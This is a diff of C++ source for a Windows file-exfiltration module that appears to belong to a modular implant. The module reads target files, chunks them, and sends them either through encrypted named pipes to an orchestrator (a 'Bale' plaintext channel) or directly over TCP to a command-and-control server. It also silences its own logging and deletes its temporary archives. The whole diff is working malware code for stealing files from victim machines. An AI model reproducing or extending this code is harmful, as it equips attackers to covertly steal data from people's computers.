@@ -4,12 +4,17 @@
  *            sends reports and chunked file data on report pipe.
  *===========================================================================*/
 
+#define WIN32_LEAN_AND_MEAN
 #include "Atom_05_Exfil.h"
 #include "../Orchestrator/AtomManager.h"
 #include "../Orchestrator/Config.h"
 #include <bcrypt.h>
 #include <cstdarg>
 #include <cstdio>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "ws2_32.lib")
+#include "../Orchestrator/TurboSend.h"
 #include <cstring>
 #include <string>
 
@@ -26,6 +31,7 @@ typedef struct _EXFIL_HEADER {
 } EXFIL_HEADER;
 
 static void ExfilDebug(const char *format, ...) {
+  if (!Config::LOGGING_ENABLED) return;
   char buf[512];
   va_list args;
   va_start(args, format);
@@ -177,6 +183,8 @@ DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
       if (IPC_ReceiveMessage(hCmdPipe, &inMsg, SharedSessionKey, 16)) {
         if (inMsg.CommandId == CMD_EXECUTE) {
           std::string filePath((char *)inMsg.Payload, inMsg.dwPayloadLen);
+          BOOL bIsBale = (filePath.find("BALE_") == 0);
+          if (bIsBale) filePath = filePath.substr(5);
           ExfilDebug("[Atom 5] Received CMD_EXECUTE: %s", filePath.c_str());
 
           // Validate path
@@ -210,7 +218,11 @@ DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
                   }
               } else {
                   ExfilDebug("[Atom 5] Path is a directory. Waiting for ZIP confirmation.");
-                  SendErrorReport(hReportPipe, "[EXFIL_DIR_DETECTED]", SharedSessionKey, dwAtomId);
+                  if (bIsBale) {
+                      SendErrorReport(hReportPipe, "[EXFIL] INFO: Target is a directory. Use /exfil ZIP:<path> to compress and send.", SharedSessionKey, dwAtomId);
+                  } else {
+                      SendErrorReport(hReportPipe, "[EXFIL_DIR_DETECTED]", SharedSessionKey, dwAtomId);
+                  }
                   continue;
               }
           }
@@ -240,90 +252,116 @@ DWORD WINAPI ExfiltrationAtomMain(LPVOID lpParam) {
           DWORD totalChunks = (dwFileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
           ExfilDebug("[Atom 5] File size: %lu bytes, %lu chunks (Starting at %lu)", dwFileSize, totalChunks, dwStartChunk);
 
-          // Send META on report pipe
-          std::string meta =
-              "META:" + filePath + ":" + std::to_string(totalChunks);
-          IPC_MESSAGE msg = {0};
-          msg.dwSignature = 0x534D4952;
-          msg.CommandId = CMD_FORWARD_REPORT;
-          msg.AtomId = dwAtomId;
-          msg.dwPayloadLen = (DWORD)meta.length();
-          memcpy(msg.Payload, meta.c_str(), meta.length());
-          IPC_SendMessage(hReportPipe, &msg, SharedSessionKey, 16);
-          ExfilDebug("[Atom 5] META sent: %s", meta.c_str());
+          if (bIsBale) {
+              // === BALE PATH: Send plaintext file with chunked protocol ===
+              // IPC pipe is already encrypted, no need for AES-GCM on top.
+              // Uses 0x10/0x11/0x12 flags for Bale reassembly.
 
-          BYTE plainBuf[CHUNK_SIZE];
-          DWORD dwBytesRead, dwSequence = dwStartChunk, dwTotalSent = (dwStartChunk * CHUNK_SIZE);
-
-          while (dwSequence < totalChunks) {
-            DWORD bytesToRead = (dwSequence == totalChunks - 1)
-                                    ? (dwFileSize - (dwSequence * CHUNK_SIZE))
-                                    : CHUNK_SIZE;
-            SetFilePointer(hFile, dwSequence * CHUNK_SIZE, NULL, FILE_BEGIN);
-            if (!ReadFile(hFile, plainBuf, bytesToRead, &dwBytesRead, NULL) ||
-                dwBytesRead == 0)
-              break;
-
-            EXFIL_HEADER header;
-            header.dwSequence = dwSequence;
-            header.dwChunkLen = dwBytesRead;
-            GenerateRandomIV(header.IV, sizeof(header.IV));
-
-            BYTE cipherBuf[CHUNK_SIZE];
-            if (!AesGcmEncrypt(AesExfilKey, header.IV, plainBuf, dwBytesRead,
-                               cipherBuf, header.Tag))
-              break;
-
-            IPC_MESSAGE outMsg = {0};
-            outMsg.dwSignature = 0x534D4952;
-            outMsg.CommandId = CMD_FORWARD_REPORT;
-            outMsg.AtomId = dwAtomId;
-            DWORD msgSize = sizeof(header) + dwBytesRead;
-            outMsg.dwPayloadLen = msgSize;
-            memcpy(outMsg.Payload, &header, sizeof(header));
-            memcpy(outMsg.Payload + sizeof(header), cipherBuf, dwBytesRead);
-
-            BOOL acked = FALSE;
-            for (int retry = 0; retry < MAX_RETRIES; retry++) {
-              if (IPC_SendMessage(hReportPipe, &outMsg, SharedSessionKey,
-                                  16)) {
-                if (WaitForAck(hCmdPipe, dwSequence, SharedSessionKey)) {
-                  acked = TRUE;
-                  dwTotalSent += dwBytesRead;
-                  ExfilDebug("[Atom 5] Chunk %lu ACKed", dwSequence);
-                  break;
-                }
-              } else {
-                ExfilDebug(
-                    "[Atom 5] IPC_SendMessage failed for chunk %lu",
-                    dwSequence);
+              // CHUNK START — send metadata
+              {
+                std::string meta = "name=" + filePath.substr(filePath.find_last_of("\\/") + 1) + 
+                                   " size=" + std::to_string(dwFileSize);
+                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                hdr.dwType = 3; // File
+                hdr.dwFlags = 0x10; // BALE_FLAG_CHUNK_START
+                hdr.dwPayloadLen = (DWORD)meta.length();
+                IPC_MESSAGE startMsg = {0};
+                startMsg.dwSignature = 0x534D4952;
+                startMsg.CommandId = CMD_BALE_REPORT;
+                startMsg.AtomId = dwAtomId;
+                startMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
+                memcpy(startMsg.Payload, &hdr, sizeof(hdr));
+                memcpy(startMsg.Payload + sizeof(hdr), meta.c_str(), hdr.dwPayloadLen);
+                IPC_SendMessage(hReportPipe, &startMsg, SharedSessionKey, 16);
+                ExfilDebug("[Atom 5] BALE CHUNK_START sent: %s", meta.c_str());
               }
-              Sleep(1000);
-            }
-            if (!acked) {
-              ExfilDebug("[Atom 5] Failed to get ACK for chunk %lu after %d "
-                         "retries. Aborting.",
-                         dwSequence, MAX_RETRIES);
-              break;
-            }
-            dwSequence++;
+
+              // CHUNK DATA — stream plaintext file in IPC-sized pieces
+              BYTE plainBuf[CHUNK_SIZE];
+              DWORD dwBytesRead, dwTotalSent = 0;
+              DWORD chunkMax = MAX_IPC_PAYLOAD_SIZE - sizeof(DWORD)*3 - 64;
+
+              SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+              BOOL bStopExfil = FALSE;
+              while (ReadFile(hFile, plainBuf, min(CHUNK_SIZE, chunkMax), &dwBytesRead, NULL) && dwBytesRead > 0 && !bStopExfil) {
+                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                hdr.dwType = 3;
+                hdr.dwFlags = 0x11; // BALE_FLAG_CHUNK_DATA
+                hdr.dwPayloadLen = dwBytesRead;
+
+                IPC_MESSAGE chunkMsg = {0};
+                chunkMsg.dwSignature = 0x534D4952;
+                chunkMsg.CommandId = CMD_BALE_REPORT;
+                chunkMsg.AtomId = dwAtomId;
+                chunkMsg.dwPayloadLen = sizeof(hdr) + dwBytesRead;
+                memcpy(chunkMsg.Payload, &hdr, sizeof(hdr));
+                memcpy(chunkMsg.Payload + sizeof(hdr), plainBuf, dwBytesRead);
+                IPC_SendMessage(hReportPipe, &chunkMsg, SharedSessionKey, 16);
+                dwTotalSent += dwBytesRead;
+
+                // Check for stop command every chunk
+                DWORD dwStopAvail = 0;
+                if (PeekNamedPipe(hCmdPipe, NULL, 0, NULL, &dwStopAvail, NULL) && dwStopAvail > 0) {
+                    IPC_MESSAGE stopMsg = {0};
+                    if (IPC_ReceiveMessage(hCmdPipe, &stopMsg, SharedSessionKey, 16)) {
+                        std::string stopCmd((char*)stopMsg.Payload, stopMsg.dwPayloadLen);
+                        if (stopCmd == "TERMINATE" || stopCmd == "BALE_STOP" || stopCmd.find("/stop_live") != std::string::npos || 
+                            stopMsg.CommandId == CMD_TERMINATE || stopMsg.CommandId == CMD_STOP_ALL) {
+                            ExfilDebug("[Atom 5] Exfiltration ABORTED by command.");
+                            bStopExfil = TRUE;
+                        }
+                    }
+                }
+              }
+
+              // CHUNK END
+              {
+                std::string done = "DONE:" + std::to_string(dwTotalSent);
+                struct { DWORD dwType; DWORD dwFlags; DWORD dwPayloadLen; } hdr;
+                hdr.dwType = 3;
+                hdr.dwFlags = 0x12; // BALE_FLAG_CHUNK_END
+                hdr.dwPayloadLen = (DWORD)done.length();
+                IPC_MESSAGE endMsg = {0};
+                endMsg.dwSignature = 0x534D4952;
+                endMsg.CommandId = CMD_BALE_REPORT;
+                endMsg.AtomId = dwAtomId;
+                endMsg.dwPayloadLen = sizeof(hdr) + hdr.dwPayloadLen;
+                memcpy(endMsg.Payload, &hdr, sizeof(hdr));
+                memcpy(endMsg.Payload + sizeof(hdr), done.c_str(), hdr.dwPayloadLen);
+                IPC_SendMessage(hReportPipe, &endMsg, SharedSessionKey, 16);
+              }
+
+              CloseHandle(hFile);
+              ExfilDebug("[Atom 5] BALE transfer complete. Sent %lu bytes plaintext.", dwTotalSent);
+
+          } else {
+              // === C2 PATH: Turbo TCP direct send ===
+              CloseHandle(hFile);
+              ExfilDebug("[Atom 5] Starting Turbo TCP EXFIL for %s", filePath.c_str());
+              
+              if (Turbo::SendFile("EXFIL", filePath.c_str())) {
+                  ExfilDebug("[Atom 5] Transfer finished via Turbo TCP.");
+                  
+                  // Notify Orchestrator of success
+                  std::string done = "DONE:" + std::to_string(dwFileSize);
+                  IPC_MESSAGE doneMsg = {0};
+                  doneMsg.dwSignature = 0x534D4952;
+                  doneMsg.CommandId = CMD_REPORT;
+                  doneMsg.AtomId = dwAtomId;
+                  doneMsg.dwPayloadLen = (DWORD)done.length();
+                  memcpy(doneMsg.Payload, done.c_str(), done.length());
+                  IPC_SendMessage(hReportPipe, &doneMsg, SharedSessionKey, 16);
+              } else {
+                  ExfilDebug("[Atom 5] Transfer failed via Turbo TCP.");
+                  SendErrorReport(hReportPipe, "[EXFIL] ERROR: Turbo TCP transfer failed.", SharedSessionKey, dwAtomId);
+              }
           }
-          CloseHandle(hFile);
 
           // Cleanup temp zip if we made one
           if (filePath.find("C:\\Users\\Public\\") == 0 && filePath.find(".tmp") != std::string::npos) {
               DeleteFileA(filePath.c_str());
               ExfilDebug("[Atom 5] Cleaned up temp zip.");
           }
-
-          std::string done = "DONE:" + std::to_string(dwTotalSent);
-          IPC_MESSAGE doneMsg = {0};
-          doneMsg.dwSignature = 0x534D4952;
-          doneMsg.CommandId = CMD_REPORT;
-          doneMsg.dwPayloadLen = (DWORD)done.length();
-          memcpy(doneMsg.Payload, done.c_str(), done.length());
-          IPC_SendMessage(hReportPipe, &doneMsg, SharedSessionKey, 16);
-          ExfilDebug("[Atom 5] Transfer finished. Sent %lu bytes", dwTotalSent);
         } else if (inMsg.CommandId == CMD_TERMINATE) {
           ExfilDebug("[Atom 5] Received CMD_TERMINATE. Exiting.");
           break;
